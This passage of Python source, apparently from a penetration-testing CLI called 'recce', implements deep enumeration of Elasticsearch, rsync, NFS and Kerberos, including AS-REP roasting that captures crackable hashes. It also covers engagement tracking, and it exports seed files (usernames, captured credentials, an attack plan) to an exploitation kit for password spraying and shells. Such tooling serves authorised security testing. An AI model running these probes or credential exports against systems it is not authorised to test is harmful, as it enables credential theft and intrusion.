    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    active = not args.no_probe
    analysis = _es.analyze(hosts, active=active, **_probe_kwargs(args, "elasticsearch"))
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No Elasticsearch endpoints in the datastore (no port 9200/9201). "
              "Run `enum` against the search/log hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} Elasticsearch endpoint(s):")
    for t in tgts:
        if t.get("unauth"):
            state = f"EXPOSED (unauth, {t.get('indices', 0)} indices)"
        elif t.get("secured"):
            state = "security enforced"
        else:
            state = "probed" if t.get("version") else "reachable"
        ver = f"  {t.get('version', '')}" if t.get("version") else ""
        print(f"      {t['ip']}:{t['port']}  {state}{ver}")

    _fold_service_findings(store, hosts, analysis, "elasticsearch",
                           _es.findings_to_vulns, "Elasticsearch")
    if active:
        _mark_capability_scanned(store, tgts)
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    print("    -> Elasticsearch sheet written; findings folded into the main totals.")
    return 0


def cmd_rsync(args: argparse.Namespace) -> int:
    """Deep rsync-daemon enumeration: speak the rsync daemon protocol (stdlib), list
    the modules, and test each for anonymous access - an @RSYNCD: OK module is a
    CONFIRMED unauthenticated file exposure. Read-only (never transfers a file)."""
    from . import rsync as _rsync
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts expose rsync.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    active = not args.no_probe
    analysis = _rsync.analyze(hosts, active=active, **_probe_kwargs(args, "rsync"))
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No rsync endpoints in the datastore (no port 873). Run `enum` "
              "against the file hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} rsync endpoint(s):")
    for t in tgts:
        mods = t.get("modules", 0)
        state = (f"{t.get('open', 0)}/{mods} module(s) open" if mods
                 else "probed" if active else "reachable")
        print(f"      {t['ip']}:{t['port']}  {state}")

    _fold_service_findings(store, hosts, analysis, "rsync",
                           _rsync.findings_to_vulns, "rsync")
    if active:
        _mark_capability_scanned(store, tgts)
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    print("    -> rsync sheet written; findings folded into the main totals.")
    return 0


def cmd_nfs(args: argparse.Namespace) -> int:
    """Deep NFS enumeration: speak ONC RPC (stdlib) to the portmapper + mountd, list
    the exports (showmount -e), and flag any shared to every host - a world-mountable
    export is a CONFIRMED exposure. Read-only (never mounts)."""
    from . import nfs as _nfs
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first so recce "
              "knows which hosts expose NFS.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    active = not args.no_probe
    analysis = _nfs.analyze(hosts, active=active, **_probe_kwargs(args, "nfs"))
    tgts = analysis["targets"]
    if not tgts:
        print("[!] No NFS endpoints in the datastore (no port 2049/111). Run `enum` "
              "against the file hosts first.")
        store.close()
        return 0
    print(f"[+] {len(tgts)} NFS host(s):")
    for t in tgts:
        exp = t.get("exports", 0)
        if t.get("world"):
            state = f"{t['world']}/{exp} export(s) WORLD-mountable"
        elif exp:
            state = f"{exp} export(s) listed"
        else:
            state = "probed" if active else "reachable"
        print(f"      {t['ip']}  {state}")

    _fold_service_findings(store, hosts, analysis, "nfs",
                           _nfs.findings_to_vulns, "NFS")
    if active:
        _mark_capability_scanned(store, tgts)
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    print("    -> NFS sheet written; findings folded into the main totals.")
    return 0


def cmd_kerberos(args: argparse.Namespace) -> int:
    """Credential-less AD roasting: speak Kerberos (stdlib) to the DC, AS-REP roast
    every pre-auth-disabled account (capture a crackable hash with NO credential), and
    validate usernames via the KDC's pre-auth response. Read-only - no logon, no
    lockouts."""
    from . import kerberos as _krb
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` (and, for the "
              "user list, `ldap`/`ad`) first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)

    # Candidate users: --user / --userlist override the enumerated account names.
    users = None
    if getattr(args, "user", None):
        users = list(args.user)
    elif getattr(args, "userlist", None):
        try:
            with open(args.userlist, encoding="utf-8", errors="replace") as fh:
                users = [ln.strip() for ln in fh if ln.strip()
                         and not ln.startswith("#")]
        except OSError as e:
            print(f"[x] Could not read --userlist {args.userlist!r}: {e}")
            store.close()
            return 1
    # Privileged names (for critical severity) from admin-flagged accounts.
    privileged = {a.name.lower() for h in hosts for a in (h.accounts or [])
                  if str((a.attrs or {}).get("admincount", "")).lower() in ("1", "true")
                  or a.name.lower() in ("administrator", "admin")}

    active = not args.no_probe
    realm = getattr(args, "domain", "") or store.get_meta("domain") or ""
    # AS-REQ is one TCP connection to the DC per user, sequentially. Warn before a
    # large, slow, and network-noisy run so it isn't mistaken for a hang.
    n_users = len(users) if users is not None else len(_krb.candidate_users(hosts))
    if active and n_users > 200:
        print(f"[*] Testing {n_users} username(s) against the DC - one AS-REQ each, "
              f"sequentially ({n_users} connections to a single DC). This can take a "
              "while and is network-noisy; narrow with --userlist / --user if needed.")
    analysis = _krb.analyze(hosts, users=users, realm=realm,
                            dc_ip=getattr(args, "dc_ip", "") or "",
                            privileged=privileged, active=active,
                            **_probe_kwargs(args, "kerberos"))
    if not analysis["dc_ip"]:
        print("[!] No Kerberos DC found (no host with port 88). Pass --dc-ip, or run "
              "`enum` against the domain controller first.")
        store.close()
        return 0
    if not analysis["realm"]:
        print("[!] No realm/domain known. Pass --domain <REALM> (e.g. CORP.LOCAL).")
        store.close()
        return 0
    st = analysis["stats"]
    if not analysis["results"]:
        print(f"[!] No candidate usernames to test against {analysis['dc_ip']} "
              f"({analysis['realm']}). Enumerate users (ldap/ad) or pass --userlist.")
        store.close()
        return 0
    # If every AS-REQ came back "no_reply", the DC never answered - don't present
    # that as "0 valid" (which reads like a clean, complete test).
    if active and all(r["state"] == "no_reply" for r in analysis["results"]):
        print(f"[!] The DC {analysis['dc_ip']}:88 did not answer any AS-REQ "
              f"({st['users_tested']} attempted). Check the DC IP / that TCP 88 is "
              "reachable, then re-run. Nothing was concluded about these accounts.")
        store.close()
        return 0
    print(f"[+] Kerberos {analysis['realm']} @ {analysis['dc_ip']}: tested "
          f"{st['users_tested']} user(s) -> {st['valid']} valid, "
          f"{st['roastable']} AS-REP roastable.")
    for r in analysis["results"]:
        if r["state"] == "roastable":
            print(f"      [ROASTABLE] {r['user']}")

    _fold_service_findings(store, hosts, analysis, "kerberos",
                           _krb.findings_to_vulns, "Kerberos")
    if active:
        _mark_capability_scanned(store, [{"ip": analysis["dc_ip"], "port": 88}])
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    print("    -> Kerberos sheet written; findings folded into the main totals.")
    return 0


def cmd_report(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)  # honor Excel edits before regenerating
    # Persist the QoD noise floor so every later regeneration honors it too. 0 shows all;
    # 70 (MIN_QOD_VISIBLE) hides banner/version leads; higher shows only verified findings.
    min_qod = getattr(args, "min_qod", None)
    if min_qod is not None:
        store.set_meta("min_qod", str(max(0, min_qod)))
        if min_qod > 0:
            print(f"[*] Filtering the report to findings with QoD >= {min_qod} "
                  "(--min-qod 0 to show all).")
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    return 0


def _deprecated_alias(fn, old: str, new: str):
    """Wrap a command so a pre-rename spelling keeps working, with a nudge to the new one."""
    def _run(args: argparse.Namespace) -> int:
        print(f"[!] `recce {old}` is deprecated - use `recce {new}`.", file=sys.stderr)
        return fn(args)
    return _run


def cmd_fieldkit_export(args: argparse.Namespace) -> int:
    """Export the engagement as a seed for the fieldkit exploitation kit."""
    from . import fieldkit
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']} - run `enum` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)
    hosts = [h for h in hosts if h.is_up]
    if not hosts:
        print("[!] No live hosts to export. Run `enum`/`vulns` first.")
        store.close()
        return 1
    title = store.get_meta("engagement") or args.title
    creds = store.all_credentials()
    out_dir = os.path.join(args.output_dir, "fieldkit")
    os.makedirs(out_dir, exist_ok=True)
    bridge = fieldkit.build_bridge(hosts, engagement=title, generated=_now(), creds=creds)

    users = fieldkit.collect_users(hosts, creds)
    cred_lines = fieldkit.collect_creds(creds)
    files = {
        "ports.gnmap": fieldkit.build_gnmap(hosts),
        "smb-null.txt": fieldkit.build_smb_null(hosts),
        "recce-bridge.json": json.dumps(bridge, indent=2) + "\n",
        "FIELDKIT.md": fieldkit.build_plan_md(bridge),
        "users.txt": ("\n".join(users) + "\n") if users
                     else "# (recce enumerated no usernames yet — run credenum / ldap)\n",
        "creds.txt": ("# known credentials (reference for gen_shell.py) — "
                      "domain/user:secret\n" + "\n".join(cred_lines) + "\n") if cred_lines
                     else "# (recce holds no captured credentials yet)\n",
    }
    for name, content in files.items():
        with open(os.path.join(out_dir, name), "w") as fh:
            fh.write(content)
    _relax_perms(out_dir)

    actionable = sum(1 for h in bridge["hosts"]
                     if h["suggested"] or h["findings"] or h["exploit_cmds"])
    print(f"[+] fieldkit seed written to {out_dir}/ "
          f"({len(bridge['hosts'])} live host(s), {actionable} with a fieldkit route, "
          f"{len(users)} user(s), {len(creds)} cred(s)):")
    print(f"    ports.gnmap        -> sweep.py triage --nmap ports.gnmap")
    print(f"    smb-null.txt       -> sweep.py triage --nxc smb-null.txt")
    print(f"    recce-bridge.json  -> sweep.py triage --recce recce-bridge.json  (richest)")
    print(f"    FIELDKIT.md        -> human, severity-ranked attack plan")
    print(f"    users.txt/creds.txt-> gen_spray.py --users / gen_shell.py")
    print(f"    Next (in the fieldkit checkout): "
          f"python3 access/network/sweep.py triage --recce {out_dir}/recce-bridge.json")
    store.close()
    return 0


def cmd_fieldkit_import(args: argparse.Namespace) -> int:
    """Fold a fieldkit findings.json (proven exploitation) back into the workbook + report."""
    from . import fieldkit
    from .models import Host, Port
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']} - run `enum` first, or `import` a scan.")
        return 1
    if not os.path.exists(args.findings):
        print(f"[x] No such file: {args.findings}")
        return 1
    try:
        with open(args.findings) as fh:
            data = json.load(fh)
    except (OSError, ValueError) as e:
        print(f"[x] Cannot read {args.findings}: {e}")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)

    by_host = fieldkit.findings_to_hosts(data)
    if not by_host:
        print("[!] No usable findings in the file (need affected_host + steps).")
        store.close()
        return 1
    all_hosts = store.all_hosts()
    hosts_by_ip = {h.ip: h for h in all_hosts}
    # Resolve a hostname-only finding (affected_host had no IP) onto the host recce
    # already enumerated under that name, so it merges instead of forking a synthetic
    # `fieldkit:<name>` entry. First hostname wins on a collision.
    hosts_by_name = {}
    for h in all_hosts:
        for hn in h.hostnames:
            hosts_by_name.setdefault(hn.lower(), h)
    added_total = created = touched = 0
    for key, bucket in by_host.items():
        h = hosts_by_ip.get(key)
        if h is None and not bucket["ip"] and bucket["hostname"]:
            h = hosts_by_name.get(bucket["hostname"].lower())   # match by hostname
        if h is None:
            subnet = (".".join(key.split(".")[:3]) + ".0/24") if bucket["ip"] else ""
            h = Host(ip=key, subnet=subnet, enumerated=True)
            if bucket["hostname"]:
                h.hostnames = [bucket["hostname"]]
            created += 1
        elif bucket["hostname"] and bucket["hostname"] not in h.hostnames:
            h.hostnames.append(bucket["hostname"])
        have = {(v.title, v.port) for v in h.vulns}
        new = [v for v in bucket["vulns"] if (v.title, v.port) not in have]
        if not new:
            continue
        for v in new:
            v.ip = h.ip                        # keep Vuln.ip aligned with the host it lands on
        h.vulns.extend(new)
        # A proven fieldkit finding is a confirmed foothold on the host.
        if not h.access_gained:
            h.access_gained = True
            h.access_detail = h.access_detail or "fieldkit: proven exploitation (imported findings)"
        store.upsert_host(h)
        added_total += len(new)
        touched += 1

    print(f"[+] Imported {added_total} fieldkit finding(s) across {touched} host(s)"
          + (f" ({created} new host entry/entries)" if created else "") + ".")
    print("    Source 'fieldkit' (confidence 'confirmed') -> Vulnerabilities sheet, "
          "report, and write-ups. Hosts marked access-gained.")
    if added_total:
        title = store.get_meta("engagement") or args.title
        _generate_reports(store, paths, title)
    store.close()
    return 0


def _add_budget(parser) -> None:
    """A wall-clock cap for a deep module's sequential probe loop."""
    parser.add_argument("--budget", type=float, metavar="SECONDS",
                        help="stop probing after this many seconds and keep partial "
                             "results (default: no cap)")


def _probe_progress(label: str):
    """A throttled per-target progress printer for the sequential deep-module loops,
    so a long run reads as 'working' rather than 'hung'. Quiet on tiny runs."""
    import time
    last = [0.0]

    def cb(i, n, t):
        if n < 8:
            return                                     # small runs: the summary suffices
        now = time.monotonic()
        if now - last[0] >= 2.0 or i == n:
            last[0] = now
            who = t.get("ip", "") if isinstance(t, dict) else str(t)
            print(f"    [{i}/{n}] {label} {who} ...", flush=True)
    return cb


def _probe_kwargs(args, label: str) -> dict:
    """budget + progress kwargs for a deep module's analyze()."""
    return {"budget": getattr(args, "budget", None),
            "progress": _probe_progress(label)}


def _report_partial(stats) -> None:
    """Tell the operator when a probe loop stopped early (budget / Ctrl-C) so partial
    results are never mistaken for a complete, clean assessment."""
    stopped = (stats or {}).get("stopped")
    if stopped == "budget":
        print("    [!] Time budget (--budget) reached - stopped early; partial results "
              "saved. Raise --budget or narrow the targets to finish the rest.")
    elif stopped == "interrupt":
        print("    [!] Interrupted - stopped early; results probed so far were saved.")


def _fold_service_findings(store, hosts, analysis, source, to_vulns, label):
    """Shared tail for the deep-service commands (smb/ftp/docker/kubernetes/mssql):
    sort findings by severity, fold them into their hosts (replacing this source's
    prior vulns, deduped by key), persist the analysis blob under `source`, and print
    a per-severity summary. Capability marking stays with each command (its gating
    differs). Returns {ip: [Vuln]} so a caller can post-process the touched hosts."""
    analysis["findings"].sort(key=lambda x: _SEV_ORDER.get(x["severity"], 5))
    analysis["stats"]["findings"] = len(analysis["findings"])
    by_ip = to_vulns(analysis["findings"])
    host_by_ip = {h.ip: h for h in hosts}
    for ip, vulns in by_ip.items():
        host = host_by_ip.get(ip) or store.get_host(ip)
        if host is None:
            continue
        have = {v.key for v in host.vulns if v.source != source}
        host.vulns = [v for v in host.vulns if v.source != source]   # refresh this source
        for v in vulns:
            if v.key not in have:
                have.add(v.key)
                host.vulns.append(v)
        store.upsert_host(host, merge=False)
    store.set_meta(source, json.dumps(analysis))
    fs = analysis["findings"]
    if fs:
        by_sev: dict = {}
        for f in fs:
            by_sev[f["severity"]] = by_sev.get(f["severity"], 0) + 1
        print(f"[+] {len(fs)} {label} finding(s): "
              + ", ".join(f"{by_sev[s]} {s}" for s in
                          ("critical", "high", "medium", "low") if by_sev.get(s)))
    _report_partial(analysis.get("stats"))
    return by_ip


def _mark_capability_scanned(store, targets, db: bool = False) -> None:
    """After a deep-service capability runs (smb/ftp/docker/kubernetes/mssql), mark
    each port it actually assessed as vuln-scanned - and the host as db-scanned for a
    database service - so the Checklist auto-checkboxes and coverage reflect the work
    without the tester ticking anything by hand. `targets` is the module's list of
    {ip, port} it probed (including clean ones, so a 'nothing found' probe still counts)."""
    per_host: dict[str, set] = {}
    for t in targets:
        if t.get("ip") and t.get("port"):
            per_host.setdefault(t["ip"], set()).add(int(t["port"]))
    for ip, ports in per_host.items():
        h = store.get_host(ip)
        if h is None:
            continue
        changed = False
        for p in h.ports:
            if p.portid in ports and not p.vuln_scanned:
                p.vuln_scanned = True
                changed = True
        if db and not h.db_scanned:
            h.db_scanned = True
            changed = True
        if changed:
            store.upsert_host(h, merge=False)     # full host loaded -> safe rewrite


def _service_module_coverage(store, hosts) -> list[dict]:
    """Per deep-service-module (mssql/smb/ftp/docker/kubernetes): how many hosts with
    an applicable open port have actually had the module run. 'Run' = the host appears
    in the module's stored analysis targets, or it carries a finding from that source.
    Ordered highest-impact first so `status` surfaces the critical exposures."""
    from . import (mssql, smb, ftp, docker, kubernetes as k8s, ldap as _ldap,
                   snmp as _snmp, mongodb as _mongo, redis as _redis,
                   elasticsearch as _es, rsync as _rsync, nfs as _nfs,
                   kerberos as _krb)
    mods = [
        ("MongoDB", "mongodb", _mongo.is_mongodb, "recce mongodb"),
        ("Redis", "redis", _redis.is_redis, "recce redis"),
        ("Elasticsearch", "elasticsearch", _es.is_elasticsearch, "recce elasticsearch"),
        ("rsync", "rsync", _rsync.is_rsync, "recce rsync"),
        ("NFS", "nfs", _nfs.is_nfs, "recce nfs"),
        ("Kerberos", "kerberos", _krb.is_kerberos, "recce kerberos -d DOMAIN"),
        ("Docker", "docker", docker.is_docker, "recce docker"),
        ("Kubernetes", "kubernetes", k8s.is_k8s, "recce k8s"),
        ("MSSQL", "mssql", mssql.is_mssql, "recce mssql -u USER -p PASS -d DOM"),
        ("LDAP", "ldap", _ldap.is_ldap, "recce ldap"),
        ("SNMP", "snmp", _snmp.is_snmp, "recce snmp"),
        ("SMB", "smb", smb.is_smb, "recce smb"),
        ("FTP", "ftp", ftp.is_ftp, "recce ftp"),
    ]
    out = []
    for name, key, pred, command in mods:
        applicable = [h for h in hosts if any(pred(p) for p in h.open_ports)]
        covered_ips: set = set()
        blob = store.get_meta(key)
        if blob:
            try:
                for t in (json.loads(blob).get("targets") or []):
                    if t.get("ip"):
                        covered_ips.add(t["ip"])
            except ValueError:
                pass
        for h in hosts:
            if any(v.source == key for v in h.vulns):
                covered_ips.add(h.ip)
        out.append({"name": name, "key": key, "command": command,
                    "applicable": len(applicable),
                    "covered": sum(1 for h in applicable if h.ip in covered_ips)})
    return out


def cmd_status(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)  # pick up latest Excel edits
    tracking = store.get_tracking()
    hosts = store.all_hosts()
    cov = tr.compute_coverage(hosts, tracking)
    labels = {"hosts": "Hosts", "services": "Services", "vulns": "Vulnerabilities",
              "web": "Web", "exploits": "Exploits", "quick_wins": "AD Quick Wins",
              "accounts": "Users & Accounts"}

    def bar(pct):
        f = round(pct / 5)
        return "#" * f + "-" * (20 - f)

    title = store.get_meta("engagement") or "engagement"
    print(f"\n== Coverage: {title} ==\n")

    # Scan issues first - the operator needs to know if anything failed/incomplete.
    counts = store.count_issues()
    if counts.get("total"):
        print(f"  ⚠ {counts['total']} scan issue(s): {counts.get('error', 0)} error, "
              f"{counts.get('warning', 0)} incomplete "
              f"(Overview tab / {paths['log']})")
        for i in store.get_issues()[:8]:
            print(f"      [{i['level'].upper()}] {i['ip']} {i['message']}")
        if counts["total"] > 8:
            print(f"      ... and {counts['total'] - 8} more")
        print()

    o = cov["overall"]
    print(f"  OVERALL      [{bar(o['pct'])}] {o['pct']:3d}%  {o['done']}/{o['total']}")
    print()
    for cat in tr.COVERAGE_CATEGORIES:
        c = cov[cat]
        print(f"  {labels[cat]:<13}[{bar(c['pct'])}] {c['pct']:3d}%  {c['done']}/{c['total']}")

    # Per-step completion, counting only hosts the step applies to.
    def phase_count(step):
        applic = [h for h in hosts if tr.step_applies(h, step)]
        return sum(1 for h in applic if tr.step_auto(h, step)), len(applic)

    def manual_count(step):
        applic = [h for h in hosts if tr.step_applies(h, step)]
        done = sum(1 for h in applic
                   if tracking.get(tr.step_key(step, h.ip), (False, ""))[0])
        return done, len(applic)

    def merged_count(step):
        # Matches the Checklist cell: operator tick if set, else the auto/derived state.
        applic = [h for h in hosts if tr.step_applies(h, step)]
        done = 0
        for h in applic:
            k = tr.step_key(step, h.ip)
            done += 1 if (tracking[k][0] if k in tracking
                          else tr.step_auto(h, step)) else 0
        return done, len(applic)

    en_d, en_t = phase_count("enum")
    vs_d, vs_t = phase_count("vuln")
    web_d, web_t = phase_count("web")
    db_d, db_t = phase_count("db")
    open_ports = [p for h in hosts for p in h.open_ports]
    scanned_ports = sum(1 for p in open_ports if p.vuln_scanned)
    print("\n  Tool progress (auto) - per step, hosts complete / applicable:")
    print(f"    Enumerated    {en_d}/{en_t}")
    print(f"    Vuln-scanned  {vs_d}/{vs_t}"
          + (f"   ({scanned_ports}/{len(open_ports)} open ports)" if open_ports else ""))
    print(f"    Web           {web_d}/{web_t}   (hosts serving HTTP/HTTPS)")
    print(f"    DB-scanned    {db_d}/{db_t}   (hosts with DB services)")
    ac_d, ac_t = merged_count("access")
    print(f"    Access gained {ac_d}/{ac_t}   (foothold: creds/admin/SSH/MSSQL "
          "- see `recce access`)")

    # Deep service-module coverage (mssql / smb / ftp / docker / kubernetes): for each
    # module, how many hosts with an applicable service have actually had it run.
    svc_cov = _service_module_coverage(store, hosts)
    shown = [m for m in svc_cov if m["applicable"]]
    if shown:
        print("\n  Service deep-dives (per applicable service) - hosts run / applicable:")
        for m in shown:
            flag = "" if m["covered"] >= m["applicable"] else f"   ! run: {m['command']}"
            print(f"    {m['name']:<13} {m['covered']}/{m['applicable']}{flag}")

    # Manual sign-offs (from your ticks): AD review + the kill-chain.
    ad_d, ad_t = manual_count("ad")
    cr_d, cr_t = manual_count("creds")
    lat_d, lat_t = manual_count("lateral")
    pe_done = sum(1 for h in hosts if h.privesc_checked)
    print("\n  Manual sign-offs (from your ticks) - hosts done / applicable:")
    print(f"    AD reviewed   {ad_d}/{ad_t}   (domain controllers / directory hosts)")
    print(f"    Priv-esc      {pe_done}/{len(hosts)}   (post-exploitation performed)")
    print(f"    Creds got     {cr_d}/{cr_t}")
    print(f"    Lateral       {lat_d}/{lat_t}")
    pending = [h.ip for h in hosts if h.enumerated
               and any(not p.vuln_scanned for p in h.open_ports)]
    if pending:
        print(f"    ! still to vuln-scan: {', '.join(pending[:15])}"
              + (" ..." if len(pending) > 15 else ""))

    print("\n  By subnet (hosts reviewed):")
    for subnet, s in sorted(tr.subnet_coverage(hosts, tracking).items()):
        print(f"    {subnet:<20} {s['pct']:3d}%  {s['done']}/{s['total']}")

    # Outstanding high-value items.
    unreviewed_dc = [h for h in ad.domain_controllers(hosts)
                     if not tracking.get(tr.host_key(h.ip), (False, ""))[0]]
    unreviewed_vuln_hosts = [
        h for h in hosts
        if any(v.severity in ("critical", "high") for v in h.vulns)
        and not tracking.get(tr.host_key(h.ip), (False, ""))[0]
    ]
    scope = store.get_meta("port_scope")
    if scope:
        full = "65535" in scope
        print(f"\n  {'·' if full else '!!'} Port scope: {scope}"
              + ("" if full else " - PARTIAL (not a full scan; re-run with --all-ports)"))
    incomplete = [h for h in hosts if getattr(h, "incomplete_scan", False)]
    if incomplete:
        print("\n  !! INCOMPLETE port sweeps (host-timeout) - these port lists are "
              "PARTIAL, so downstream phases may be missing services:")
        print("     " + ", ".join(h.ip for h in sorted(incomplete, key=lambda x: _ip_key(x.ip))))
        print("     Re-scan with a larger --host-timeout (or --top-ports to narrow "
              "scope) to complete them.")
    if unreviewed_dc:
        print("\n  ! Unreviewed Domain Controllers: "
              + ", ".join(h.ip for h in unreviewed_dc))
    if unreviewed_vuln_hosts:
        print("  ! Unreviewed hosts with high/critical findings: "
              + ", ".join(h.ip for h in sorted(unreviewed_vuln_hosts, key=lambda x: _ip_key(x.ip))))

    # Suggested next step, so you always know what to run.
    o = args.output_dir
    if not hosts:
        nxt = f"recce enum <targets> -o {o}   # nothing scanned yet"
    elif en_d < en_t or vs_d < vs_t:
        nxt = f"recce vulns --unscanned -o {o}   # vuln-scan the rest"
    elif db_t and db_d < db_t:
        nxt = f"recce db -o {o}   # enumerate the databases"
    elif any(m["applicable"] > m["covered"] for m in svc_cov):
        pend = [m for m in svc_cov if m["applicable"] > m["covered"]]
        if len(pend) == 1:
            m = pend[0]
            gap = m["applicable"] - m["covered"]
            nxt = (f"{m['command']} -o {o}   # deep-enum {m['name']} "
                   f"({gap} applicable host(s) not yet run)")
        else:
            names = ", ".join(m["name"] for m in pend)
            nxt = (f"recce sweep -o {o}   # run the deep modules in one shot "
                   f"({names} pending; add creds via `recce credsweep`)")
    elif pe_done < len(hosts):
        nxt = f"recce privesc -o {o}   # build the priv-esc playbook"
    else:
        nxt = "all phases complete - review the workbook and tick Reviewed."
    print(f"\n  Next: {nxt}")
    print()
    store.close()
    return 0


def cmd_access(args: argparse.Namespace) -> int:
    """Record and review initial access (footholds) per host. recce auto-derives
    access as the credentialed phases run (valid creds / local admin / SSH / MSSQL);
    use this to see the picture across the engagement, or to record a foothold you
    gained by other means so the Checklist Access step ticks."""
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    hosts = _selected_hosts(store.all_hosts(), args)
    changed: list = []

    if args.host:
        targeted = set(args.host)
        for h in hosts:
            if h.ip not in targeted:
                continue
            if args.undo:
                if h.access_gained:
                    h.access_gained, h.access_detail = False, ""
                    changed.append(h)
            else:
                h.access_gained = True
                h.access_detail = (args.note or h.access_detail
                                   or "manual: operator-recorded foothold")
                changed.append(h)
        for h in changed:
            store.upsert_host(h, merge=False)
        print(f"[+] Access {'cleared on' if args.undo else 'recorded on'} "
              f"{len(changed)} host(s).")
    else:
        # Re-derive from the stable credentialed findings (credenum / SSH); never
        # clears a flag a module already set (e.g. MSSQL access).
        for h in hosts:
            if h.access_gained:
                continue
            detail = tr.access_from_findings(h)
            if detail:
                h.access_gained, h.access_detail = True, detail
                changed.append(h)
        for h in changed:
            store.upsert_host(h, merge=False)
        if changed:
            print(f"[+] Derived access on {len(changed)} host(s) from existing findings.")

    applicable = [h for h in hosts if h.open_ports]
    gained = [h for h in sorted(hosts, key=lambda x: _ip_key(x.ip)) if h.access_gained]
    print(f"\n  Access gained: {len(gained)}/{len(applicable)} host(s) with a foothold\n")
    for h in gained:
        name = f" ({h.hostname})" if h.hostname else ""
        print(f"    {h.ip}{name}  -  {h.access_detail}")
    if not gained:
        print("    (none yet - gain access via `credsweep` / `credenum` / `mssql`, or "
              "record one: `recce access --host IP --note '...'`)")
    print()

    if changed:
        _generate_reports(store, paths, store.get_meta("engagement") or args.title)
    store.close()
    return 0


def cmd_review(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)  # capture pending Excel edits first
    reviewed = not args.undo
    keys: list[str] = []

    for ip in args.host or []:
        keys.append(tr.host_key(ip))
        if args.cascade:  # also mark all that host's services
            h = store.get_host(ip)
            if h:
                keys += [tr.svc_key(ip, p.protocol, p.portid) for p in h.open_ports]
    for spec in args.service or []:
        ip, _, port = spec.partition(":")
        if not port.isdigit():
            print(f"[!] Skipping --service {spec!r}: expected IP:PORT (numeric port).")
            continue
        portid = int(port)
        # Resolve the real protocol from the stored host so a UDP service ticks the
        # right coverage key (hardcoding tcp silently no-ops for UDP items).
        proto = "tcp"
        h = store.get_host(ip)
        if h:
            match = next((p for p in h.open_ports if p.portid == portid), None)
            if match:
                proto = match.protocol
        keys.append(tr.svc_key(ip, proto, portid))
    keys += args.key or []

    if not keys:
        print("[x] Nothing to mark. Use --host, --service ip:port, or --key.")
        store.close()
        return 1
    for k in keys:
        store.set_reviewed(k, reviewed, notes=args.note)
    print(f"[+] Marked {len(keys)} item(s) as {'reviewed' if reviewed else 'not reviewed'}.")
    _generate_reports(store, paths, store.get_meta("engagement") or args.title, quiet=True)
    store.close()
    return 0


# --- demo command ----------------------------------------------------------------

def cmd_demo(args: argparse.Namespace) -> int:
    sample = os.path.join(os.path.dirname(__file__), "sample_scan.xml")
    if not os.path.exists(sample):
        print("[x] Sample XML missing.")
        return 1
    paths = _open_paths(args.output_dir)
    store = _open_store(paths["db"])
    if store is None:
        return 1
    store.set_meta("engagement", "DEMO engagement")
    store.set_scope("10.0.10.0/24", 254)   # demo scope: three /24s
    store.set_scope("10.0.20.0/24", 254)
    store.set_scope("10.0.30.0/24", 254)   # in scope but no live hosts found
    from .models import Exploit
    from .targets import _subnet_of
    # Stand-in for searchsploit output (unavailable offline in the demo).
    demo_exploits = {
        "10.0.20.6": [Exploit(ip="10.0.20.6", port=21, product="vsftpd", version="2.3.4",
                              edb_id="17491", title="vsftpd 2.3.4 - Backdoor Command Execution",
                              type="remote", path="unix/remote/17491.rb",
                              cves=["CVE-2011-2523"])],
        "10.0.20.5": [Exploit(ip="10.0.20.5", port=80, product="Apache httpd", version="2.4.41",
                              edb_id="50383", title="Apache 2.4.49/2.4.50 - Path Traversal & RCE",
                              type="webapps", path="multiple/webapps/50383.sh",
                              cves=["CVE-2021-41773", "CVE-2021-42013"])],
    }
    for h in np.parse_nmap_xml(sample):
        h.subnet = _subnet_of(h.ip)
        ad.identify_roles(h)
        ad.parse_signing_and_ntlm(h)
